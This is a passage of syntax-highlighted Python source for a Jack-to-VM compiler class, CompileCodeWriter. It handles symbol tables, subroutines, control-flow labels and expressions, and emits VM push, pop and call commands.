VmWriter,SEG_TYPE,OP_TYPE,opdict</span><br><span class="line"><span class="keyword">from</span> CompileEngine <span class="keyword">import</span> CompileEngine</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CompileCodeWriter</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,infile)</span>:</span></span><br><span class="line">        <span class="comment"># read all source code string to the buffer</span></span><br><span class="line">        self.parser = JackTokenizer(infile)</span><br><span class="line">        self.engile = CompileEngine(infile)</span><br><span class="line">        self.out = VmWriter(infile)</span><br><span class="line">        <span class="comment"># class global symbol table</span></span><br><span class="line">        self.classTable = SymbolTable()</span><br><span class="line">        <span class="comment"># sub routine symbol table</span></span><br><span class="line">        self.subTable = SymbolTable()</span><br><span class="line">        <span class="comment"># vm writer</span></span><br><span class="line">        self.vmout = VmWriter(infile)</span><br><span class="line">        <span class="comment"># class name</span></span><br><span class="line">        self.classname = <span class="string">""</span></span><br><span class="line">        self.subname = <span class="string">""</span></span><br><span class="line">        self.subkind = <span class="string">""</span></span><br><span class="line">        self.subtype = <span class="string">""</span></span><br><span class="line">        self.iflabelcnt = <span class="number">0</span></span><br><span class="line">        self.whilelabelcnt = <span class="number">0</span></span><br><span class="line">        self.writeClassCode()</span><br><span class="line">        self.out.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ifLabel</span><span class="params">(self)</span>:</span></span><br><span class="line">        res = []</span><br><span class="line">        res.append(<span class="string">"IF_END"</span> + str(self.iflabelcnt))</span><br><span class="line">        res.append(<span class="string">"IF_"</span> + str(self.iflabelcnt))</span><br><span class="line">        self.iflabelcnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">whileLabel</span><span class="params">(self)</span>:</span></span><br><span class="line">        res = []</span><br><span class="line">        res.append(<span class="string">"WHILE_EXP"</span> + str(self.whilelabelcnt))</span><br><span class="line">        res.append(<span class="string">"WHILE_END"</span> + str(self.whilelabelcnt))</span><br><span class="line">        self.whilelabelcnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">functionLabel</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.classname + <span class="string">"."</span> + self.subname</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeClassCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.classTable.startSubroutine()</span><br><span class="line">        <span class="comment"># parse class</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse class name</span></span><br><span class="line">        self.classname = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment">#parse symbol '&#123;' </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment">#parse class val des</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">              (self.parser.keyWord() == <span class="string">"static"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"field"</span>):</span><br><span class="line">            self.writeClassVarDecCode()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#parse class method</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">            (self.parser.keyWord() == <span class="string">"method"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"constructor"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"function"</span>):</span><br><span class="line">            self.subkind = self.parser.keyWord()</span><br><span class="line">            self.writeSubroutineCode()</span><br><span class="line">        <span class="comment">#parse symbol '&#123;'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>          </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeClassVarDecCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        varname = <span class="string">""</span></span><br><span class="line">        vartype = <span class="string">""</span></span><br><span class="line">        varkind = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        varkind = self.parser.keyWord()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse val type</span></span><br><span class="line">        vartype = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse val name</span></span><br><span class="line">        varname = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment">#add one var define to the symbol table</span></span><br><span class="line">        self.classTable.define(varname,vartype,varkind)</span><br><span class="line">        <span class="comment"># parse the left val name</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">";"</span>):</span><br><span class="line">            <span class="comment"># parse symbol ','</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse val name</span></span><br><span class="line">            varname = self.parser.currToken()</span><br><span class="line">            self.classTable.define(varname,vartype,varkind)</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="comment"># parse the end symbol ';'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeSubroutineCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        fieldcnt = <span class="number">0</span></span><br><span class="line">        self.subTable.startSubroutine()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        self.subkind = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="keyword">if</span> self.subkind == <span class="string">"method"</span>:</span><br><span class="line">            self.subTable.define(<span class="string">"this"</span>,self.classname,<span class="string">"argument"</span>)</span><br><span class="line">        <span class="comment"># parse type</span></span><br><span class="line">        self.subtype = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse subroutineName</span></span><br><span class="line">        self.subname = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse param list</span></span><br><span class="line">        self.writeParameterListCode()</span><br><span class="line">        <span class="comment"># parse ')'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse body</span></span><br><span class="line">        self.writeSubroutineBodyCode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeSubroutineBodyCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        nlocals = <span class="number">0</span></span><br><span class="line">        <span class="comment"># parse '&#123;'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse var </span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"var"</span>:</span><br><span class="line">            nlocals += self.writeVarDecCode()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># function define</span></span><br><span class="line">        funcname = self.classname + <span class="string">"."</span> + self.subname</span><br><span class="line">        self.out.writeFunction(funcname,nlocals)</span><br><span class="line">        <span class="keyword">if</span> self.subkind == <span class="string">"constructor"</span>:</span><br><span class="line">            fieldcnt = self.classTable.varCount(<span class="string">"field"</span>)</span><br><span class="line">            self.out.writePush(<span class="string">"constant"</span>,fieldcnt)</span><br><span class="line">            self.out.writeCall(<span class="string">"Memory.alloc"</span>,<span class="number">1</span>)</span><br><span class="line">            self.out.writePop(<span class="string">"pointer"</span>,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">elif</span> self.subkind == <span class="string">"method"</span>:</span><br><span class="line">            self.out.writePush(<span class="string">"argument"</span>,<span class="number">0</span>)</span><br><span class="line">            self.out.writePop(<span class="string">"pointer"</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.writeStatementsCode()</span><br><span class="line">        <span class="comment"># parse '&#125;'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeParameterListCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        varname = <span class="string">""</span></span><br><span class="line">        varkind = <span class="string">"argument"</span></span><br><span class="line">        vartype = <span class="string">""</span></span><br><span class="line">        paramcnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse rest param</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span>\</span><br><span class="line">            self.parser.symbol() == <span class="string">")"</span>):</span><br><span class="line">            <span class="comment"># parse element type</span></span><br><span class="line">            vartype = self.parser.currToken()</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse element varName</span></span><br><span class="line">            varname = self.parser.currToken()</span><br><span class="line">            paramcnt += <span class="number">1</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># add argument variable into the symbol table</span></span><br><span class="line">            self.subTable.define(varname,vartype,varkind)</span><br><span class="line">            <span class="comment"># parse ','</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">                <span class="keyword">if</span> self.parser.symbol() == <span class="string">","</span>:</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">elif</span> self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> paramcnt</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeVarDecCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        nlocals = <span class="number">1</span></span><br><span class="line">        varname = <span class="string">""</span></span><br><span class="line">        varkind = <span class="string">"var"</span></span><br><span class="line">        vartype = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        varkind = self.parser.keyWord()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse var type</span></span><br><span class="line">        vartype = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse var name</span></span><br><span class="line">        varname = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        self.subTable.define(varname,vartype,varkind)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the rest var name</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">";"</span>):</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse var name</span></span><br><span class="line">            nlocals += <span class="number">1</span></span><br><span class="line">            varname = self.parser.currToken()</span><br><span class="line">            self.subTable.define(varname,vartype,varkind)</span><br><span class="line">            self.parser.advance()</span><br><span class="line">  </span><br><span class="line">        <span class="comment"># parse the end symbol  </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="keyword">return</span> nlocals </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeStatementsCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">             (self.parser.keyWord() == <span class="string">"do"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"if"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"while"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"let"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"return"</span>):</span><br><span class="line">            <span class="keyword">if</span> self.parser.keyWord() == <span class="string">"do"</span>:</span><br><span class="line">                self.writeDoCode()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"if"</span>:</span><br><span class="line">                self.writeIfCode()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"while"</span>:</span><br><span class="line">                self.writeWhileCode()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"let"</span>:</span><br><span class="line">                self.writeLetCode()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"return"</span>:</span><br><span class="line">                self.writeReturnCode()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid statement define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeDoCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        funcname = []</span><br><span class="line">        argsCnt = <span class="number">0</span></span><br><span class="line">        varname = <span class="string">""</span></span><br><span class="line">        vartype = <span class="string">""</span></span><br><span class="line">        varkind = <span class="string">""</span></span><br><span class="line">        varidx  = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse do</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse 'call name'</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"("</span>):</span><br><span class="line">            <span class="comment"># write code</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() != TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">                funcname.append(self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># sub call</span></span><br><span class="line">        callname = <span class="string">""</span></span><br><span class="line">        varname = funcname[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> len(funcname) == <span class="number">1</span>:</span><br><span class="line">            self.out.writePush(<span class="string">"pointer"</span>,<span class="number">0</span>)</span><br><span class="line">            callname = self.classname + <span class="string">"."</span> + funcname[<span class="number">0</span>]</span><br><span class="line">            argsCnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> len(funcname) == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> self.subTable.indexOf(varname) &gt;= <span class="number">0</span>:</span><br><span class="line">                vartype = self.subTable.typeOf(varname)</span><br><span class="line">                varkind = self.subTable.kindOf(varname)</span><br><span class="line">                varidx =  self.subTable.indexOf(varname)</span><br><span class="line">                callname = vartype + <span class="string">"."</span> + funcname[<span class="number">1</span>]</span><br><span class="line">                argsCnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> varkind == <span class="string">"field"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"this"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"var"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"local"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"static"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"static"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"argument"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"argument"</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span>  self.classTable.indexOf(varname) &gt;= <span class="number">0</span>:</span><br><span class="line">                vartype = self.classTable.typeOf(varname)</span><br><span class="line">                varkind = self.classTable.kindOf(varname)</span><br><span class="line">                varidx =  self.classTable.indexOf(varname)</span><br><span class="line">                callname = vartype + <span class="string">"."</span> + funcname[<span class="number">1</span>]</span><br><span class="line">                argsCnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> varkind == <span class="string">"field"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"this"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"var"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"local"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"static"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"static"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"argument"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"argument"</span>,varidx)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                callname = funcname[<span class="number">0</span>] + <span class="string">"."</span> + funcname[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># parse expression list       </span></span><br><span class="line">        argsCnt += self.writeExpressionListCode()</span><br><span class="line">        <span class="comment"># parse ')'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse  ';'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># write call name</span></span><br><span class="line">        self.out.writeCall(callname,argsCnt)</span><br><span class="line">        self.out.writePop(<span class="string">"temp"</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeLetCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        varname = <span class="string">""</span></span><br><span class="line">        vartype = <span class="string">""</span></span><br><span class="line">        varkind = <span class="string">""</span></span><br><span class="line">        varidx  = <span class="string">""</span></span><br><span class="line">        isArray = <span class="literal">False</span></span><br><span class="line">        <span class="comment"># parse let </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">   </span><br><span class="line">        <span class="comment"># parse varname</span></span><br><span class="line">        varname = self.parser.currToken()</span><br><span class="line">        <span class="comment"># search the key</span></span><br><span class="line">        <span class="keyword">if</span> self.subTable.indexOf(varname) &gt;= <span class="number">0</span>:</span><br><span class="line">            vartype = self.subTable.typeOf(varname)</span><br><span class="line">            varkind = self.subTable.kindOf(varname)</span><br><span class="line">            varidx =  self.subTable.indexOf(varname)</span><br><span class="line">        <span class="keyword">elif</span>  self.classTable.indexOf(varname) &gt;= <span class="number">0</span>:</span><br><span class="line">            vartype = self.classTable.typeOf(varname)</span><br><span class="line">            varkind = self.classTable.kindOf(varname)</span><br><span class="line">            varidx =  self.classTable.indexOf(varname)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"invalid var statement!"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># skip varname</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">      </span><br><span class="line">        <span class="comment"># parse `[expression]`</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">'['</span>:</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># we push the head arrdress of the array</span></span><br><span class="line">            isArray = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># parse '['</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            self.writeExpressionCode()</span><br><span class="line">            <span class="comment"># we parse the array</span></span><br><span class="line">            <span class="keyword">if</span> varkind == <span class="string">"field"</span>:</span><br><span class="line">                self.out.writePush(<span class="string">"this"</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">"var"</span>:</span><br><span class="line">                self.out.writePush(<span class="string">"local"</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">"static"</span>:</span><br><span class="line">                self.out.writePush(<span class="string">"static"</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">"argument"</span>:</span><br><span class="line">                self.out.writePush(<span class="string">"argument"</span>,varidx)</span><br><span class="line">            self.out.writeArithmetic(<span class="string">"+"</span>)</span><br><span class="line">            <span class="comment"># parse ']'</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  '='</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.writeExpressionCode()</span><br><span class="line">        <span class="comment"># pop value from the stack</span></span><br><span class="line">        <span class="keyword">if</span> isArray:</span><br><span class="line">            self.out.writePop(<span class="string">"temp"</span>,<span class="number">0</span>)</span><br><span class="line">            self.out.writePop(<span class="string">"pointer"</span>,<span class="number">1</span>)</span><br><span class="line">            self.out.writePush(<span class="string">"temp"</span>,<span class="number">0</span>)</span><br><span class="line">            self.out.writePop(<span class="string">"that"</span>,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> varkind == <span class="string">"field"</span>:</span><br><span class="line">                self.out.writePop(<span class="string">"this"</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">"var"</span>:</span><br><span class="line">                self.out.writePop(<span class="string">"local"</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">"static"</span>:</span><br><span class="line">                self.out.writePop(<span class="string">"static"</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">"argument"</span>:</span><br><span class="line">                self.out.writePop(<span class="string">"argument"</span>,varidx)</span><br><span class="line">        <span class="comment"># parse  ';'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeWhileCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        label = self.whileLabel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse return </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.out.writeLabel(label[<span class="number">0</span>])</span><br><span class="line">        self.writeExpressionCode()</span><br><span class="line">        self.out.writeSigArithmetic(<span class="string">"~"</span>)</span><br><span class="line">        self.out.writeIf(label[<span class="number">1</span>])</span><br><span class="line">        <span class="comment"># parse  ')'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse  '&#123;'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.writeStatementsCode()</span><br><span class="line">        self.out.writeGoto(label[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># parse  '&#125;'</span></span><br><span class="line">        self.out.writeLabel(label[<span class="number">1</span>])</span><br><span class="line">        self.parser.advance()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeReturnCode</span><span class="params">(self)</span>:</span>        </span><br><span class="line">        <span class="comment"># parse return </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse expression  list</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">';'</span>):</span><br><span class="line">            self.writeExpressionCode()</span><br><span class="line">        <span class="comment"># parse ';'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="keyword">if</span> self.subtype == <span class="string">"void"</span>:</span><br><span class="line">            self.out.writePush(<span class="string">"constant"</span>,<span class="number">0</span>)</span><br><span class="line">        self.out.writeReturn()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeIfCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        label = self.ifLabel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse if </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.writeExpressionCode()</span><br><span class="line">        self.out.writeSigArithmetic(<span class="string">"~"</span>)</span><br><span class="line">        <span class="comment"># parse ')'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse '&#123;'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.out.writeIf(label[<span class="number">1</span>])</span><br><span class="line">        self.writeStatementsCode()</span><br><span class="line">        self.out.writeGoto(label[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># parse '&#125;'</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">   </span><br><span class="line">        <span class="comment"># parse else</span></span><br><span class="line">        self.out.writeLabel(label[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"else"</span>:</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># parse 'else'</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse '&#123;'</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse statements</span></span><br><span class="line">            self.writeStatementsCode()</span><br><span class="line">            <span class="comment"># parse '&#125;'</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">        self.out.writeLabel(label[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeExpressionCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># parse term</span></span><br><span class="line">        self.writeTermCode()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse op</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.symbol() == <span class="string">"+"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"-"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"*"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"/"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&amp;"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"|"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&gt;"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"&lt;"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"="</span>):</span><br><span class="line">            <span class="comment"># parse op</span></span><br><span class="line">            op = self.parser.symbol()</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse term</span></span><br><span class="line">            self.writeTermCode()</span><br><span class="line">            <span class="comment"># code write op</span></span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">"*"</span>:</span><br><span class="line">                self.out.writeCall(<span class="string">"Math.multiply"</span>,<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">'/'</span>:</span><br><span class="line">                self.out.writeCall(<span class="string">"Math.divide"</span>,<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.out.writeArithmetic(op)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeTermCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        varname = <span class="string">""</span></span><br><span class="line">        vartype = <span class="string">""</span></span><br><span class="line">        varkind = <span class="string">""</span></span><br><span class="line">        varidx  = <span class="number">0</span></span><br><span class="line">        paramCnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">            <span class="comment"># push constant x</span></span><br><span class="line">            self.out.writePush(<span class="string">"constant"</span>,self.parser.intVal())</span><br><span class="line">            <span class="comment">#print(self.parser.intVal())</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">            <span class="comment"># push string x</span></span><br><span class="line">            val = self.parser.stringVal()</span><br><span class="line">            self.out.writePush(<span class="string">"constant"</span>,len(val))</span><br><span class="line">            self.out.writeCall(<span class="string">"String.new"</span>,<span class="number">1</span>)</span><br><span class="line">            <span 